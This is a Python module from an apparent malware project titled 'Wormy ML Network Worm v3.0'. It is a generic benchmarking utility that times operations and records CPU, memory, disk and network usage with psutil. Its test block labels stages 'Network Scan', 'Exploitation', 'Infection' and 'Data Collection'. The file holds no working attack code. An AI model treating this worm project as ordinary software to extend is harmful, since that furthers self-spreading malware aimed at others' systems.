"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Performance Benchmarking System
Measures and tracks worm performance metrics
"""


import os
import sys
import time
from datetime import datetime
from typing import Dict, List

import psutil

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class PerformanceBenchmark:
    """
    Comprehensive performance benchmarking
    """

    def __init__(self):
        self.benchmarks = {}
        self.system_metrics = []
        self.start_time = time.time()

        logger.info("Performance Benchmark initialized")

    def start_benchmark(self, name: str):
        """Start a benchmark"""
        self.benchmarks[name] = {
            "start_time": time.time(),
            "end_time": None,
            "duration": None,
            "cpu_start": psutil.cpu_percent(),
            "memory_start": psutil.virtual_memory().percent,
        }

    def end_benchmark(self, name: str):
        """End a benchmark"""
        if name in self.benchmarks:
            self.benchmarks[name]["end_time"] = time.time()
            self.benchmarks[name]["duration"] = (
                self.benchmarks[name]["end_time"] - self.benchmarks[name]["start_time"]
            )
            self.benchmarks[name]["cpu_end"] = psutil.cpu_percent()
            self.benchmarks[name]["memory_end"] = psutil.virtual_memory().percent

    def record_system_metrics(self):
        """Record current system metrics"""
        self.system_metrics.append(
            {
                "timestamp": time.time(),
                "cpu_percent": psutil.cpu_percent(interval=0.1),
                "memory_percent": psutil.virtual_memory().percent,
                "memory_mb": psutil.virtual_memory().used / 1024 / 1024,
                "disk_io": psutil.disk_io_counters()._asdict() if psutil.disk_io_counters() else {},
                "network_io": psutil.net_io_counters()._asdict(),
            }
        )

    def get_benchmark_results(self) -> Dict:
        """Get all benchmark results"""
        results = {}

        for name, data in self.benchmarks.items():
            if data["duration"] is not None:
                results[name] = {
                    "duration_seconds": data["duration"],
                    "duration_ms": data["duration"] * 1000,
                    "cpu_usage": data["cpu_end"] - data["cpu_start"],
                    "memory_usage": data["memory_end"] - data["memory_start"],
                }

        return results

    def generate_performance_report(self) -> str:
        """Generate performance report"""
        results = self.get_benchmark_results()
        total_time = time.time() - self.start_time

        report = f"""# Performance Benchmark Report

**Generated**: {datetime.now().isoformat()}  
**Total Runtime**: {total_time:.2f}s

## Benchmark Results

"""

        for name, data in sorted(
            results.items(), key=lambda x: x[1]["duration_seconds"], reverse=True
        ):
            report += f"### {name}\n"
            report += (
                f"- **Duration**: {data['duration_seconds']:.3f}s ({data['duration_ms']:.1f}ms)\n"
            )
            report += f"- **CPU Impact**: {data['cpu_usage']:+.1f}%\n"
            report += f"- **Memory Impact**: {data['memory_usage']:+.1f}%\n\n"

        # System metrics summary
        if self.system_metrics:
            avg_cpu = sum(m["cpu_percent"] for m in self.system_metrics) / len(self.system_metrics)
            avg_memory = sum(m["memory_percent"] for m in self.system_metrics) / len(
                self.system_metrics
            )
            avg_memory_mb = sum(m["memory_mb"] for m in self.system_metrics) / len(
                self.system_metrics
            )

            report += f"""## System Resource Usage

- **Average CPU**: {avg_cpu:.1f}%
- **Average Memory**: {avg_memory:.1f}% ({avg_memory_mb:.0f} MB)
- **Samples**: {len(self.system_metrics)}
"""

        return report

    def print_summary(self):
        """Print benchmark summary"""
        results = self.get_benchmark_results()

        print("\n" + "=" * 60)
        print(" " * 15 + "PERFORMANCE BENCHMARKS")
        print("=" * 60)

        for name, data in sorted(
            results.items(), key=lambda x: x[1]["duration_seconds"], reverse=True
        ):
            print(f"\n{name}:")
            print(f"  Duration: {data['duration_seconds']:.3f}s")
            print(f"  CPU: {data['cpu_usage']:+.1f}%")
            print(f"  Memory: {data['memory_usage']:+.1f}%")

        print("\n" + "=" * 60 + "\n")


class PerformanceOptimizer:
    """
    Analyzes performance and suggests optimizations
    """

    def __init__(self):
        self.recommendations = []
        logger.info("Performance Optimizer initialized")

    def analyze_benchmarks(self, benchmark: PerformanceBenchmark) -> List[str]:
        """Analyze benchmarks and provide recommendations"""
        results = benchmark.get_benchmark_results()
        recommendations = []

        # Check for slow operations
        for name, data in results.items():
            if data["duration_seconds"] > 5.0:
                recommendations.append(
                    f"⚠️ {name} is slow ({data['duration_seconds']:.1f}s). Consider optimization."
                )

            if data["cpu_usage"] > 50:
                recommendations.append(
                    f"⚠️ {name} uses high CPU ({data['cpu_usage']:+.1f}%). Consider async processing."
                )

            if data["memory_usage"] > 20:
                recommendations.append(
                    f"⚠️ {name} uses high memory ({data['memory_usage']:+.1f}%). Check for memory leaks."
                )

        # System-wide recommendations
        if benchmark.system_metrics:
            avg_cpu = sum(m["cpu_percent"] for m in benchmark.system_metrics) / len(
                benchmark.system_metrics
            )
            avg_memory = sum(m["memory_percent"] for m in benchmark.system_metrics) / len(
                benchmark.system_metrics
            )

            if avg_cpu > 80:
                recommendations.append(
                    "⚠️ High average CPU usage. Consider reducing concurrent operations."
                )

            if avg_memory > 80:
                recommendations.append(
                    "⚠️ High average memory usage. Implement memory cleanup routines."
                )

        if not recommendations:
            recommendations.append("✅ Performance is optimal. No recommendations.")

        self.recommendations = recommendations
        return recommendations

    def print_recommendations(self):
        """Print optimization recommendations"""
        print("\n" + "=" * 60)
        print(" " * 15 + "OPTIMIZATION RECOMMENDATIONS")
        print("=" * 60 + "\n")

        for rec in self.recommendations:
            print(f"  {rec}")

        print("\n" + "=" * 60 + "\n")


if __name__ == "__main__":
    # Test benchmarking
    benchmark = PerformanceBenchmark()

    print("=" * 60)
    print("PERFORMANCE BENCHMARKING TEST")
    print("=" * 60)

    # Benchmark some operations
    benchmark.start_benchmark("Network Scan")
    time.sleep(0.5)
    benchmark.record_system_metrics()
    benchmark.end_benchmark("Network Scan")

    benchmark.start_benchmark("Exploitation")
    time.sleep(0.3)
    benchmark.record_system_metrics()
    benchmark.end_benchmark("Exploitation")

    benchmark.start_benchmark("Infection")
    time.sleep(0.2)
    benchmark.record_system_metrics()
    benchmark.end_benchmark("Infection")

    benchmark.start_benchmark("Data Collection")
    time.sleep(0.1)
    benchmark.record_system_metrics()
    benchmark.end_benchmark("Data Collection")

    # Print results
    benchmark.print_summary()

    # Analyze and optimize
    optimizer = PerformanceOptimizer()
    recommendations = optimizer.analyze_benchmarks(benchmark)
    optimizer.print_recommendations()

    # Generate report
    report = benchmark.generate_performance_report()
    print("\nReport generated:")
    print(report[:500] + "...")

    print("=" * 60)
